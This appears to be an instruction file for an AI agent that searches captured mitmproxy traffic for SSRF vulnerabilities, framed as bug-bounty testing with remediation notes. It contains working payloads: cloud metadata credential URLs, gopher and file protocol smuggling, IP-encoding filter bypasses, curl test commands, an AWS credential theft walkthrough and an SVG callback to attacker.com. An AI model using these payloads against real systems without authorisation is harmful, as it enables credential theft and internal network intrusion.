---
description: Find SSRF (Server-Side Request Forgery) vulnerabilities in captured traffic. Use when user asks about URL fetching, webhooks, integrations, or internal network access.
---

# Find SSRF Vulnerabilities

Analyze the mitmproxy dump (log.txt) for SSRF vulnerabilities for: $ARGUMENTS

## High-Value SSRF Patterns (from 113 real HackerOne bounty reports)

### 1. URL Parameters in Requests
**Common vulnerable parameters:**
```
url, uri, path, dest, redirect, link, href
src, source, file, document, page, load
target, proxy, fetch, request, callback
webhook, hook, endpoint, api_url, base_url
image_url, avatar_url, icon_url, logo_url
pdf_url, export_url, import_url, feed_url
```

**Search patterns:**
```bash
grep -iE '(url|uri|path|src|href|link|dest|redirect|webhook|callback|fetch|proxy|target)[=:]["'\''"]?https?://' log.txt
```

### 2. File/Image Processing Endpoints
**Real examples from bounties:**
- SVG upload triggers SSRF (Shopify)
- Image URL in product creation
- PDF generation with external resources
- Avatar/profile picture from URL

**Search patterns:**
```bash
grep -iE '\.(svg|pdf|xml|html)' log.txt
grep -iE '(upload|import|fetch|process).*url' log.txt
```

### 3. Integration/Webhook Endpoints
**Real examples:**
- Sentry source code scraping
- Git clone with credentials
- OAuth callback manipulation
- Webhook URL specification

**Search patterns:**
```bash
grep -iE '(webhook|callback|hook|notify|integration)' log.txt
grep -iE 'git.*clone|git.*url' log.txt
```

### 4. Host Header Injection
**Real example:** Host header bypass accessing internal subdomains
```
Host: internal.target.com
X-Forwarded-Host: internal.target.com
X-Original-URL: /internal/admin
```

**Search patterns:**
```bash
grep -iE '^Host:' log.txt
grep -iE 'X-Forwarded|X-Original' log.txt
```

## SSRF Target Payloads

### Internal Network Probing
```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://169.254.169.254  # AWS metadata
http://metadata.google.internal  # GCP metadata
http://100.100.100.200  # Alibaba metadata
```

### Cloud Metadata Endpoints (Critical)
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### Protocol Smuggling
```
file:///etc/passwd
dict://localhost:11211/
gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
ldap://localhost/
```

## Vulnerability Categories & Severity

| Type | Severity | Impact |
|------|----------|--------|
| Cloud metadata access | **CRITICAL** | AWS keys, service credentials |
| Internal service access | **HIGH** | Database, cache, admin panels |
| Blind SSRF (OOB) | **MEDIUM** | Port scanning, internal recon |
| Limited SSRF (no response) | **LOW** | Denial of service, limited recon |

## Testing Methodology

### Step 1: Identify URL Input Points
```bash
# Find URL-like parameters
grep -iE 'https?://[^\s"'\''<>]+' log.txt | grep -iE '(url|uri|src|href|link|path)='

# Find base64 encoded URLs
grep -oE '[A-Za-z0-9+/]{20,}={0,2}' log.txt | while read b; do echo "$b" | base64 -d 2>/dev/null | grep -q 'http' && echo "Base64 URL: $b"; done
```

### Step 2: Test with Internal Targets
```bash
# Test localhost
curl 'https://target.com/api/fetch?url=http://127.0.0.1:80'

# Test metadata (AWS)
curl 'https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/'

# Test with DNS rebinding
curl 'https://target.com/api/fetch?url=http://your-rebind-domain.com'
```

### Step 3: Bypass Common Filters
```bash
# IP variations
http://127.0.0.1 → http://2130706433 (decimal)
http://127.0.0.1 → http://0x7f000001 (hex)
http://127.0.0.1 → http://0177.0.0.1 (octal)
http://127.0.0.1 → http://127.1

# DNS bypass
http://localhost → http://localtest.me
http://169.254.169.254 → http://[0:0:0:0:0:ffff:169.254.169.254]

# URL encoding
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31
```

### Step 4: Confirm with Out-of-Band
```bash
# Use Burp Collaborator, webhook.site, or interactsh
curl 'https://target.com/api/fetch?url=http://YOUR-BURP-COLLABORATOR-ID.burpcollaborator.net'
```

## Real Attack Scenarios

### Scenario 1: AWS Credential Theft via SSRF
```
1. Find image import feature: POST /api/import?image_url=XXX
2. Set URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Response contains IAM role name
4. Fetch: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
5. Get temporary AWS credentials
```

### Scenario 2: Internal Service Access
```
1. Find webhook configuration
2. Set webhook URL to internal service: http://internal-admin.local/
3. Trigger webhook
4. Access internal admin panel functionality
```

### Scenario 3: Blind SSRF via SVG
```
1. Upload SVG file with external reference:
   <svg><image href="http://attacker.com/callback"/></svg>
2. Server processes SVG, fetches external URL
3. Attacker receives connection from internal IP
```

## Output Format

```
## SSRF Finding: [Brief Description]

**Endpoint**: `METHOD https://target.com/path`
**Parameter**: `param_name`
**Type**: [Full|Blind|Partial]
**Severity**: [CRITICAL|HIGH|MEDIUM|LOW]

**Evidence**:
[Request showing URL parameter]

**Tested Payloads**:
- http://127.0.0.1 → [response/behavior]
- http://169.254.169.254 → [response/behavior]

**Impact**:
- Cloud credential theft
- Internal network access
- Service enumeration

**Test Command**:
curl -X METHOD 'https://target.com/...' -d 'url=http://169.254.169.254/'

**Remediation**:
- Whitelist allowed domains
- Block private IP ranges
- Use allowlist for protocols (http/https only)
- Disable redirects or validate redirect targets
```

## False Positives to Ignore

- Static CDN URLs that are hardcoded
- OAuth redirect_uri that's validated against whitelist
- Webhook URLs that only accept HTTPS and validated domains
- URL parameters that are client-side only (JS fetch)
